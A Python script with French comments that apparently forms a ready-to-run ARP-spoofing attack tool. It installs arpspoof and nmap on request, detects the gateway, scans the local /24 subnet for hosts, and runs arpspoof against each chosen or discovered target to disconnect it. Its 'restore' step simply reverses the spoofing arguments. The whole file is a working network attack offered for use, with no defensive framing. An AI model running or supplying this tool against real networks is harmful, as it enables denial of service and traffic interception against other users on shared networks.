import os
import subprocess
import time
import sys
from affichage import afficher_logo

def check_and_install_dependencies():
    # Liste des dépendances nécessaires (arpspoof et nmap)
    dependencies = ['arpspoof', 'nmap']
    
    print("[+] Vérification des dépendances...")

    missing_dependencies = []
    for dep in dependencies:
        # Utiliser 'which' pour vérifier si l'exécutable est présent dans le PATH
        try:
            result = subprocess.run(['which', dep], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if not result.stdout.strip():
                raise FileNotFoundError
        except (subprocess.CalledProcessError, FileNotFoundError):
            print(f"[!] La dépendance '{dep}' est manquante.")
            missing_dependencies.append(dep)

    if missing_dependencies:
        print("[!] Certaines dépendances sont manquantes.")
        install = input(f"[+] Voulez-vous installer les dépendances manquantes: {', '.join(missing_dependencies)} ? (o/n) : ")
        if install.lower() == 'o':
            for dep in missing_dependencies:
                if dep == 'arpspoof':
                    print("[+] Installation de arpspoof...")
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'dsniff'])
                elif dep == 'nmap':
                    print("[+] Installation de nmap...")
                    subprocess.run(['sudo', 'apt-get', 'install', '-y', 'nmap'])
            print("[+] Dépendances installées. Vous pouvez relancer le script.")
            sys.exit()
        else:
            print("[!] Abandon de l'installation des dépendances.")
            sys.exit()

def get_gateway_ip():
    # Exécute la commande pour obtenir l'IP de la passerelle par défaut
    result = os.popen('ip route show default').read().strip()
    gateway_ip = result.split()[2]
    return gateway_ip

def get_network_interfaces():
    # Exécute la commande pour obtenir les interfaces réseau disponibles
    interfaces = os.popen('ip link show').read().strip().split('\n')
    interface_list = []
    for interface in interfaces:
        if 'state' in interface:  # On ne prend que les lignes qui représentent des interfaces réseau
            interface_name = interface.split(':')[1].strip()
            interface_list.append(interface_name)
    return interface_list

def scan_network_for_devices(network):
    # Utilise nmap pour scanner les appareils sur le réseau
    ip_range = f"{network}.0/24"
    result = subprocess.run(['nmap', '-sn', ip_range], stdout=subprocess.PIPE)
    output = result.stdout.decode('utf-8')
    
    ips = []
    for line in output.split('\n'):
        if "Nmap scan report for" in line:
            ip = line.split(' ')[-1]
            ips.append(ip)
    
    return ips

def arp_spoof(target_ip, gateway_ip, interface):
    # Lance l'attaque ARP Spoofing avec arpspoof
    try:
        subprocess.call(["arpspoof", "-i", interface, "-t", target_ip, gateway_ip])
    except FileNotFoundError:
        print("[!] arpspoof n'est pas installé. Utilisez sudo apt-get install dsniff pour l'installer.")
        exit()

def run_attack(target_ips, gateway_ip, interface):
    # Lance l'attaque ARP Spoofing sur les cibles
    for target_ip in target_ips:
        print(f"[!] Attaque ARP Spoofing en cours sur {target_ip}...")
        arp_spoof(target_ip, gateway_ip, interface)
        print(f"[+] {target_ip} est maintenant déconnecté du réseau.")
        time.sleep(2)

def restore_target_connections(target_ips, gateway_ip, interface):
    # Restaure les connexions des cibles
    for target_ip in target_ips:
        print(f"[!] Restauration de la connexion pour {target_ip}...")
        arp_spoof(gateway_ip, target_ip, interface)
        print(f"[+] {target_ip} est maintenant restauré.")
        time.sleep(2)

def main():
    # Vérifier et installer les dépendances nécessaires
    check_and_install_dependencies()

    # Afficher le logo et la signature
    afficher_logo()

    # Détection automatique de la passerelle
    gateway_ip = get_gateway_ip()
    print(f"[+] Passerelle détectée : {gateway_ip}")
    
    # Détection automatique des interfaces réseau
    interfaces = get_network_interfaces()
    print(f"[+] Interfaces détectées : {interfaces}")
    
    # Demander à l'utilisateur l'interface à utiliser
    print("[+] Entrez le nom de votre interface réseau : ")
    interface = input()
    
    # Demander à l'utilisateur s'il veut spécifier des cibles ou les détecter automatiquement
    print("[+] Entrez les adresses IP cibles séparées par des espaces ou appuyez sur Entrée pour scanner le réseau.")
    target_ips_input = input()
    
    # Si aucune cible n'est donnée, scanner le réseau
    if not target_ips_input:
        network = gateway_ip.split('.')[0] + '.' + gateway_ip.split('.')[1] + '.' + gateway_ip.split('.')[2]
        target_ips = scan_network_for_devices(network)
        print(f"[+] Cibles détectées : {target_ips}")
    else:
        target_ips = target_ips_input.split()

    # Confirmation et lancement de l'attaque
    print("[!] L'attaque ARP Spoofing commence...")
    run_attack(target_ips, gateway_ip, interface)
    
    # Demander à l'utilisateur s'il veut restaurer les connexions des cibles
    input("[!] Appuyez sur Entrée pour restaurer les connexions des cibles...")
    restore_target_connections(target_ips, gateway_ip, interface)
    
    print("[!] Attaque terminée.")

if __name__ == "__main__":
    main()
